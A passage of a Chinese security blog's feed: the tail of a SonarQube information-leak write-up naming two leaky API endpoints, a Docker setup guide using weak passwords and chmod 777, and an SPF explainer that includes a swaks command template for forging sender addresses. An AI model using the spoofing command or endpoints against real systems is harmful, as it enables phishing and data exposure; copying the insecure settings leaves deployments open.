<img src="https://V-alkoinen.github.io/post-images/1644308908733.png" alt="" loading="lazy"><br>
  2、配置Gitlab<br>
<img src="https://V-alkoinen.github.io/post-images/1644309022235.png" alt="" loading="lazy"><br>
  3、配置SMTP<br>
<img src="https://V-alkoinen.github.io/post-images/1644309248467.png" alt="" loading="lazy"><br>
  4、请求/api/settings/values接口<br>
<img src="https://V-alkoinen.github.io/post-images/1644309332550.png" alt="" loading="lazy"><br>
  5、此外/api/webservices/list接口也会泄露部分信息<br>
<img src="https://V-alkoinen.github.io/post-images/1644309409453.png" alt="" loading="lazy"></p>
<h1 id="四-修复建议">四、修复建议</h1>
<p>  升级至安全版本<br>
  为了预防供应链攻击，建议屏蔽所有第三方插件<br>
<img src="https://V-alkoinen.github.io/post-images/1644309752807.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[SonarQube 搭建]]></title>
        <id>https://V-alkoinen.github.io/post/sonarqube-da-jian/</id>
        <link href="https://V-alkoinen.github.io/post/sonarqube-da-jian/">
        </link>
        <updated>2021-11-10T08:02:09.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-sonarqube介绍">一、SonarQube介绍</h1>
<p>  <code>sonar</code>是一款静态代码质量分析工具，支持<code>Java</code>、<code>Python</code>、<code>PHP</code>、<code>JavaScript</code>、<code>CSS</code>等25种以上的语言，而且能够集成在IDE、Jenkins、Git等服务中，方便随时查看代码质量分析报告；<br>
  <code>sonar</code>通过配置的代码分析规则，从可靠性、安全性、可维护性、覆盖率、重复率等方面分析项目，风险等级从A~E划分为5个等级;<br>
  同时，<code>sonar</code>可以集成pmd、findbugs、checkstyle等插件来扩展使用其他规则来检验代码质量；</p>
<h1 id="二-sonarqube组成">二、SonarQube组成</h1>
<p>  一个sonar项目主要有以下四个组件构成：<br>
<img src="https://V-alkoinen.github.io/post-images/1644307752196.png" alt="" loading="lazy"><br>
 1、一台SonarQube Server启动3个主要过程：<br>
   Web服务器，供开发人员，管理人员浏览高质量的快照并配置SonarQube实例<br>
   基于Elasticsearch的Search Server从UI进行后退搜索<br>
   Compute Engine服务器，负责处理代码分析报告并将其保存在SonarQube数据库中<br>
 2、一个SonarQube数据库要存储：<br>
   SonarQube实例的配置（安全性，插件设置等）<br>
   项目，视图等的质量快照。<br>
 3、服务器上安装了多个SonarQube插件，可能包括语言，SCM，集成，身份验证和管理插件<br>
 4、在构建/持续集成服务器上运行一个或多个SonarScanner，以分析项目；</p>
<h1 id="三-sonarqube搭建">三、SonarQube搭建</h1>
<p> </p>
<pre><code>docker pull mysql:5.7
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644307957802.png" alt="" loading="lazy"></figure>
<pre><code>mkdir -p ./mysql/conf
mkdir -p ./mysql/logs
mkdir -p ./mysql/data
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1644308019253.png" alt="" loading="lazy"></figure>
<pre><code>docker network create sonarqube
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://V-alkoinen.github.io/post-images/1644308063767.png" alt="" loading="lazy"></figure>
<pre><code>docker run --name mysql -d -p 3306:3306 --net sonarqube -v {basedir}/sonar/mysql/conf:/etc/my.cnf.d -v {basedir}/sonar/mysql/logs:/logs -v {basedir}/sonar/mysql/data:/var/lib/mysql \
-e MYSQL_ROOT_PASSWORD=123456 \
--restart always \
--privileged=true \
--network-alias mysql \
mysql:5.7
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://V-alkoinen.github.io/post-images/1644308132821.png" alt="" loading="lazy"></figure>
<pre><code>#建数据库、用户
docker exec -it mysql bash
mysql -uroot -p'123456'
GRANT ALL ON *.* TO 'root'@'%';
create database sonar; 

CREATE USER 'sonar'@'%' IDENTIFIED WITH mysql_native_password BY 'sonar';  
GRANT ALL PRIVILEGES ON *.* TO 'sonar'@'%';
flush privileges; 
</code></pre>
<pre><code>docker pull sonarqube:7.4-community
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://V-alkoinen.github.io/post-images/1644308230796.png" alt="" loading="lazy"></figure>
<pre><code>mkdir -p ./data/sonarqube
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://V-alkoinen.github.io/post-images/1644308272770.png" alt="" loading="lazy"></figure>
<pre><code>echo &quot;vm.max_map_count=262144&quot; &gt; /etc/sysctl.conf
sysctl -p
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://V-alkoinen.github.io/post-images/1644308305721.png" alt="" loading="lazy"></figure>
<pre><code>docker run -d --name sonartest sonarqube:7.4-community
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://V-alkoinen.github.io/post-images/1644308352219.png" alt="" loading="lazy"></figure>
<pre><code>docker cp sonartest:/opt/sonarqube/conf ./data/sonarqube
docker cp sonartest:/opt/sonarqube/data ./data/sonarqube
docker cp sonartest:/opt/sonarqube/logs ./data/sonarqube
docker cp sonartest:/opt/sonarqube/extensions ./data/sonarqube
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://V-alkoinen.github.io/post-images/1644308398122.png" alt="" loading="lazy"></figure>
<pre><code>docker rm sonartest
chmod -R 777 ./data/sonarqube/
</code></pre>
<pre><code>docker run -d --name sonar -p 80:9000 \
 -e ALLOW_EMPTY_PASSWORD=yes \
 -e SONARQUBE_DATABASE_USER=sonar \
 -e SONARQUBE_DATABASE_NAME=sonar \
 -e SONARQUBE_DATABASE_PASSWORD=sonar \
 -e SONARQUBE_JDBC_URL=&quot;jdbc:mysql://mysql:3306/sonar?useUnicode=true&amp;characterEncoding=utf8&amp;rewriteBatchedStatements=true&amp;useConfigs=maxPerformance&amp;useSSL=false&quot; \
 --net sonarqube \
 --privileged=true \
 -v {basedir}/sonar/data/sonarqube/logs:/opt/sonarqube/logs \
 -v {basedir}/sonar/data/sonarqube/conf:/opt/sonarqube/conf \
 -v {basedir}/sonar/data/sonarqube/data:/opt/sonarqube/data \
 -v {basedir}/sonar/data/sonarqube/extensions:/opt/sonarqube/extensions\
 sonarqube:7.4-community
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://V-alkoinen.github.io/post-images/1644308562333.png" alt="" loading="lazy"></figure>
<p>  访问 http://IP/<br>
  默认用户名密码：admin/admin</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[邮件伪造]]></title>
        <id>https://V-alkoinen.github.io/post/you-jian-wei-zao/</id>
        <link href="https://V-alkoinen.github.io/post/you-jian-wei-zao/">
        </link>
        <updated>2021-10-16T08:34:07.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-spf简介">一、SPF简介</h1>
<p>  <code>SPF</code> ，全称为 <code>Sender Policy Framework</code>，即发件人策略框架。<br>
  我们都知道，Email通信时，使用的是 SMTP 协议（<code>Simple Mail Transfer Protocol</code>），即简单邮件传输协议。此协议在通信过程中十分简陋，发件人的邮箱地址可以由发信方进行声明，所以协议本身没有很好的安全措施。SPF 出现的目的，就是为了解决 SMTP 的安全短板。</p>
<h1 id="二-spf原理">二、SPF原理</h1>
<p>  SPF记录实际上就是一条DNS记录，原理如下：<br>
  假设邮件服务器收到了一封邮件，发送方的IP为<code>IP_Sender</code>，并且发送方生成发件人为 <code>sender@example.com</code>。为了确认发件人是否是伪造的，邮件服务器会去查询<code>example.com</code>的 SPF 记录。如果该域的 SPF 记录设置允许 IP 为<code>IP_Sender</code>的主机发送邮件，则邮件服务器就会认为这封邮件是合法的；如果不允许，邮件服务器通常会退信，并将其标记为垃圾/仿冒邮件。<br>
  因为攻击者虽然可以声称他的邮件来自<code>example.com</code>，但是它却无法操作<code>example.com</code>的 DNS 记录，并且也无法伪造自己的 IP 地址。因此 SPF 被各大厂商认可，当下基本所有的邮件服务供应商（Gmail、腾讯邮箱等）都会去验证。</p>
<h1 id="三-漏洞利用">三、漏洞利用</h1>
<p> 使用 <a href="https://github.com/jetmore/swaks">Swaks</a>进行邮件伪造<br>
 <code>swaks --to &lt;target_address&gt; --from &lt;source_address&gt; --body &lt;email_body&gt; --header &lt;email_header&gt;</code><br>
<img src="https://V-alkoinen.github.io/post-images/1642930934304.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1642930975403.png" alt="" loading="lazy"></p>
<h1 id="四-spf记录的语法">四、SPF记录的语法</h1>
<p> 一条 SPF 记录定义了一个或者多个 mechanism，而 mechanism 则定义了哪些 IP 是允许的，哪些 IP 是拒绝的。<br>
 mechanism共包含以下几类：<br>
<code>all | ip4 | ip6 | include | a | mx | ptr | exists</code><br>
 每个mechanism可以选择以下四种前缀：</p>
<pre><code>&quot;+&quot;  Pass（通过）
&quot;-&quot;  Fail（拒绝）
&quot;~&quot;  Soft Fail（软拒绝）
&quot;?&quot;  Neutral（中立）
</code></pre>
<p> 服务器验证 SPF 记录时，会依次测试每个 mechanism ，如果命中IP，则验证结果由 mechanism 前缀决定，默认前缀为<code>+</code>，如果均没有命中，则结果为 Neutral。除此之外，还有三种情况，具体解释如下（下表中的处理方法仅是 SPF 标准做出的建议）：</p>
<table>
<thead>
<tr>
<th style="text-align:center">结果</th>
<th style="text-align:center">含义</th>
<th style="text-align:center">处理方法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Pass</td>
<td style="text-align:center">发件 IP 是合法的</td>
<td style="text-align:center">接受来信</td>
</tr>
<tr>
<td style="text-align:center">Fail</td>
<td style="text-align:center">发件 IP 是非法的</td>
<td style="text-align:center">退信</td>
</tr>
<tr>
<td style="text-align:center">Soft Fail</td>
<td style="text-align:center">发件 IP 非法，但是不采取强硬措施</td>
<td style="text-align:center">接受来信，但是做标记</td>
</tr>
<tr>
<td style="text-align:center">Neutral</td>
<td style="text-align:center">SPF 记录中没有关于发件 IP 是否合法的信息</td>
<td style="text-align:center">接受来信</td>
</tr>
<tr>
<td style="text-align:center">None</td>
<td style="text-align:center">服务器没有设定 SPF 记录</td>
<td style="text-align:center">接受来信</td>
</tr>
<tr>
<td style="text-align:center">PermError</td>
<td style="text-align:center">发生了严重错误（例如 SPF 记录语法错误）</td>
<td style="text-align:center">没有规定</td>
</tr>
<tr>
<td style="text-align:center">TempError</td>
<td style="text-align:center">发生了临时错误（例如 DNS 查询失败）</td>
<td style="text-align:center">接受或拒绝</td>
</tr>
</tbody>
</table>
<h1 id="五-关于mechanisms">五、关于Mechanisms</h1>
<p> <code>all</code>:表示所有 IP，肯定会命中。因此通常把它放在 SPF 记录的结尾，表示处理剩下的所有情况。</p>
<pre><code>&quot;v=spf1 -all&quot; 拒绝所有（表示这个域名不会发出邮件）
&quot;v=spf1 +all&quot; 接受所有（域名所有者认为 SPF 是没有用的，或者根本不在乎它）
</code></pre>
<p> <code>ip4</code>:格式为<code>ip4:&lt;ip4-address&gt;</code>或者<code>ip4:&lt;ip4-network&gt;/&lt;prefix-length&gt;</code>，指定一个 IPv4 地址或者地址段。如果<code>prefix-length</code>没有给出，则默认为/32。</p>
<pre><code>&quot;v=spf1 ip4:192.168.0.1/16 -all&quot;
只允许在 192.168.0.1 ~ 192.168.255.255 范围内的 IP
</code></pre>
<p> <code>ip6</code>:格式和<code>ip4</code>类似，默认的prefix-length是/128。</p>
<pre><code>&quot;v=spf1 ip6:1080::8:800:200C:417A/96 -all&quot;
只允许在 1080::8:800:0000:0000 ~ 1080::8:800:FFFF:FFFF 范围内的 IP
</code></pre>
<p> <code>a、mx</code>:两者格式相同</p>
<pre><code>a
a/&lt;prefix-length&gt;
a:&lt;domain&gt;
a:&lt;domain&gt;/&lt;prefix-length&gt;
</code></pre>
<p> 会命中相应域名的 a 记录（或 mx 记录）中包含的 IP 地址（或地址段）。如果没有提供域名，则使用当前域名。例如：</p>
<pre><code>&quot;v=spf1 mx -all&quot;
允许当前域名的 mx 记录对应的 IP 地址。

&quot;v=spf1 mx mx:deferrals.example.com -all&quot;
允许当前域名和 deferrals.example.com 的 mx 记录对应的 IP 地址。

&quot;v=spf1 a/24 -all&quot;
类似地，这个用法则允许一个地址段。

v=spf1 a mx ip4:173.194.72.103 -all
混合使用，支持当前域名的a记录和mx记录，同时也支持一个指定的IP地址
</code></pre>
<p> <code>include</code>:格式为<code>include:&lt;domain&gt;</code>，表示引入<code>&lt;domain&gt;</code>域名下的 SPF 记录。注意，如果该域名下不存在 SPF 记录，则会导致一个PermError结果。</p>
<pre><code>&quot;v=spf1 include:example.com -all&quot; 即采用和 example.com 完全一样的 SPF 记录
</code></pre>
<p> <code>exists</code>:格式为<code>exists:&lt;domain&gt;</code>。将对<code>&lt;domain&gt;</code>执行一个 A 查询，如果有返回结果（无论结果是什么），都会看作命中。<br>
 <code>ptr</code>:格式为<code>ptr</code>或者<code>ptr:&lt;domain&gt;</code>。使用ptr机制会带来大量很大开销的 DNS 查询，所以连官方都不推荐使用它。<br>
 <code>Modifiers</code>:SPF 记录中还可以包括两种可选的 modifier；一个 modifier 只能出现一次。</p>
<pre><code>#redirect
格式为redirect=&lt;domain&gt;,将用给定域名的 SPF 记录替换当前记录。

#exp
格式为exp=&lt;domain&gt;，目的是如果邮件被拒绝，可以给出一个消息。而消息的具体内容会首先对&lt;domain&gt;执行 TXT 查询，然后执行宏扩展得到。
</code></pre>
<pre><code>v=spf1:表示采用 SPF 1 版本，现在它的最新版本就是第 1 版。
</code></pre>
<h1 id="六-添加spf记录">六、添加SPF记录</h1>
<p> 如果想通过自己的域名发邮件，那么建议为它添加 SPF 记录，通常可以通过域名供应商提供的域名解析服务进行修改。不过有很多域名供应商并不支持 SPF 记录，我们也可以创建为一条 TXT 记录。至于合法的 IP ，如果你使用的第三方域名邮箱服务，会有固定的文档告诉我们如何填写。<br>
 SPF 记录本质上是一个 DNS 记录，所以并不是修改之后立即生效的——通常需要几个小时的时间。</p>
<h1 id="七-参考">七、参考</h1>
<p> <a href="http://www.openspf.org/">open SPF</a><br>
 <a href="http://www.openspf.org/Why">SPF Why</a><br>
 <a href="http://tools.bevhost.com/spf/">Beveridge SPF Test</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DevSecOps 流程]]></title>
        <id>https://V-alkoinen.github.io/post/devsecops-liu-cheng/</id>
        <link href="https://V-alkoinen.github.io/post/devsecops-liu-cheng/">
        </link>
        <updated>2021-10-08T07:42:44.000Z</updated>
        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644133387901.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
</feed>